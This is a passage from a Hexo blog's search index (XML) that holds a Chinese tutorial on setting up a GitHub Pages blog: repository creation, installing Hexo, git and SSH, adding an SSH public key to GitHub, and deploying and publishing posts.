里面新建一个博文，就可以写。</p><h3 id="markdown语法"><a href="#markdown语法" class="headerlink" title="markdown语法"></a>markdown语法</h3><p>教程<a href="http://ibruce.info/2013/11/26/markdown/">不如</a></p><h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>这期教程就到了，欢迎订阅rss和打赏。请作者喝一杯冰可乐吧！</p>]]></content>
      
      
      <categories>
          
          <category> 博客教学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教学GitHub博客搭建</title>
      <link href="/2021/080511190.html"/>
      <url>/2021/080511190.html</url>
      
        <content type="html"><![CDATA[<h1 id="GitHub博客教学"><a href="#GitHub博客教学" class="headerlink" title="GitHub博客教学"></a>GitHub博客教学</h1><h2 id="要点如下："><a href="#要点如下：" class="headerlink" title="要点如下："></a>要点如下：</h2><ul><li>1.GitHub账号</li><li>2.linux/windows/mac 电脑<h5 id="let’s-go"><a href="#let’s-go" class="headerlink" title="let’s go"></a>let’s go</h5><h2 id="GitHub账号"><a href="#GitHub账号" class="headerlink" title="GitHub账号"></a>GitHub账号</h2>有GitHub账号就登录没有就注册一下，这里建议用手机版Firefox注册成功率比较高。登录GitHub账号，并点击右上角头像右旁的的向下三角形</li></ul><p><img src="/images/image.png" alt="upload successful"><br>之后再点击出现菜单的第二的选项 your repositories<br><img src="/images/pasted-1.png" alt="filename already exists, renamed"><br>点击new<br><img src="/images/pasted-2.png" alt="filename already exists, renamed"><br>Repository name 下面的方框填你GitHub的用户名.github.io</p><blockquote><p>你的用户名.github.io</p></blockquote><p>格式一定要是这样的！一定要是！一定要是！重要的事说三遍！之后选择绿色按键Create repository</p><h2 id="linux本地设置"><a href="#linux本地设置" class="headerlink" title="linux本地设置"></a>linux本地设置</h2><p>先安装hexo</p><pre><code> npm install -g hexo-cli </code></pre><p>安装git</p><pre><code> sudo apt install git </code></pre> <p>安装nodejs linux_nodejs<a href="https://www.cnblogs.com/cirry/p/13599472.html">菜小牛</a><br>安装ssh</p><pre><code> sudo apt install ssh </pre></code>### 连接GitHub<pre><code>git config --global user.name "GitHub用户名"git config --global user.email "GitHub邮箱"</code></pre>### 创建ssh<pre><code>ssh-keygen -t rsa -C "GitHub邮箱"</code></pre><h3 id="添加秘钥linux"><a href="#添加秘钥linux" class="headerlink" title="添加秘钥linux"></a>添加秘钥linux</h3><p>在~/.ssh目录下,查看秘钥<br> <pre><code>cd ~/.ssh && cat id_rsa.pub</code></pre></p><p>复制id_rsa.pub里的内容，登录GitHub并点击Settings。进入Settings页面，选择左边的 SSH and GPG。Title随便起一个，粘贴id_rsa.pub内容到Key中，点击Add SSH Key完成添加。<br><img src="/images/pasted-3.png" alt="filename already exists, renamed"></p><h3 id="验证连接"><a href="#验证连接" class="headerlink" title="验证连接"></a>验证连接</h3><pre><code>ssh -T git@github.com </code></pre><p>输入yes<br>显示 “Hi xxx! You’ve successfully……” 即连接成功。</p><h3 id="Hexo-初始化"><a href="#Hexo-初始化" class="headerlink" title="Hexo 初始化"></a>Hexo 初始化</h3><p>首先创建一个放配置的文件夹，这里我就以blog为例子。<br>创建文件夹和进入文件夹以及配置我就用一条命令了，不然有点杂乱。</p><pre><code>mkdir blog && cd blog && hexo init && npm install</code></pre><p>完成之后输入下面的命令，启动本地预览:</p><pre><code>hexo g && hexo s</code></pre><p>之后访问<a href="http://localhost:4000/,出现Hexo页面就说明成功了。这只是本地网页，所以我们要把他部署到GitHub上。">http://localhost:4000/,出现Hexo页面就说明成功了。这只是本地网页，所以我们要把他部署到GitHub上。</a></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>安装hexo-deployer-git</p><pre><code>npm install hexo-deployer-git --save</code></pre><p>之后在blog目录下的_config.yml结尾添加一些代码</p><blockquote><p>deploy:<br>  type: git<br>  repo:  <a href="https://github.com/用户名/h用户名.github.io.git">https://github.com/用户名/h用户名.github.io.git</a><br>  branch: master</p></blockquote><p>  保存一下，之后执行下面命令部署到GitHub上：<br> <pre><code>hexo d</code></pre></p><p>  之后终端要求你输入GitHub的账号和密码，到时候输入一下就行了。<br>完成之后打开之前创建的用户名.github.io</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>进入blog的目录，在此打开终端，创建博文</p><pre><code>hexo new "my new post"</code></pre><p>之后进入source文件夹有一个my new post.md的文件，就可以用vim等编辑器撰写博客了。<br>写完了要重新发布/部署</p><pre><code>hexo g && hexo d</code></pre><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>如果你觉得默认的主题不好看，你可以换一个主题。<br>可以参考这个博客<a href="https://www.cnblogs.com/guixinchn/p/13549768.html">咕咕星</a></p><h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>如果你觉得对你有用的话，欢迎订阅我的SSR和打赏我的微信哦。你的赏识就是我前进的动力。</p>]]></content>
      
      
      <categories>
          
          <category> 博客教学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
